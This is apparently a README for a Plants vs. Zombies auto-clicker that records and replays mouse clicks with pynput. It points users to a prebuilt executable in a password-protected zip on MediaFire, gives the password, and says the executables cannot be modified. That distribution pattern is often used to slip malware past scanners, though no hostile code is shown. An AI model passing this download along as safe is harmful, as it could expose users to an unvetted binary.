# This script records mouse clicks for game automation or testing.
# It does NOT record keyboard text or send data anywhere.


🌱 PvZ-Auto-Planter


IMPORTANT — Safety notice:

> DO NOT RUN THIS SCRIPT ON SENSITIVE DATA OR IN CRITICAL APPLICATIONS. This script will automatically click the recorded positions — it can interact with any open window. The script stops automatically after it finishes its clicks, but always test in a safe environment first.



Automate your planting process in Plants vs. Zombies — or any other game that uses mouse clicks. This tool records and replays your exact click positions, letting you automatically plant, collect, or perform repetitive actions with accurate timing.


---

⚙️ How it works

1. Run the recorder script and perform the clicks you want recorded.


2. The recorder saves coordinates to markers.txt.

3. Important: Once you finish recording, add or replace the numbers in markers.txt to the PvZ-Auto-Planter raw scripts, because you cannot modify any of the executable files.

4. Run the Planter script to replay those saved positions automatically.



Notes:

Your layout and screen resolution must match the setup you recorded. Different resolutions, scaling, or fullscreen/windowed modes will shift coordinates.

If you are not using the same display setup as the person who recorded the example (for example, not the same laptop or monitor), record your own markers before running the Planter.

You can tweak click timing and intervals directly in the script to match your system’s speed.



---

📦 Releases / Non-Python users

If you don’t have Python installed, download the zipped --onedir build attached to the latest GitHub Release. Unzip and run.



---

💻 Requirements

Python 3.x

pynput (used for mouse recording/replay)


pip install pynput


---

⚠️ Usage & Safety tips

Test in a safe, non-critical environment (e.g., a separate game window or dummy app) before running on your main account/game.

Close or minimize applications you don’t want affected.

Don’t run when sensitive windows (banking, chat, terminals, etc.) are open.

The script is designed to stop after its click sequence finishes — but unexpected situations can occur, so supervise the first few runs.



---

🔧 Customization

Edit timing/interval variables in the script to match latency and performance.

Re-record markers whenever you change resolution, window size, or layout.

markers.txt is human-readable — you can manually edit or swap marker files for different layouts.



---

🧾 Disclaimer

I am not responsible for any data loss or unintended clicks caused by misuse of this code. Use at your own risk. Always test carefully before running in a live environment, "Zip-Password is PLAEX69.9", You eventually going to need python to run the raw scripts anyway in case the PvZ-Auto-Planter doesn't work on your resolution or window size setup.


---

🧾 Credits

Recording and automation scripts by Krystal David (PLAEX69.9)

Uses the pynput library (© M. H. van der Velden)



---

🔗 Links

Alternative download: https://www.mediafire.com/file/htlivdkg08jal2w/PvsZ-Auto-Planting.zip/file

Farm setup reference: https://plantsvszombies.fandom.com/wiki/Money_guide

https://youtu.be/04wnN7pfUo8?si=t19AjTmC6HHzq6Rb


---
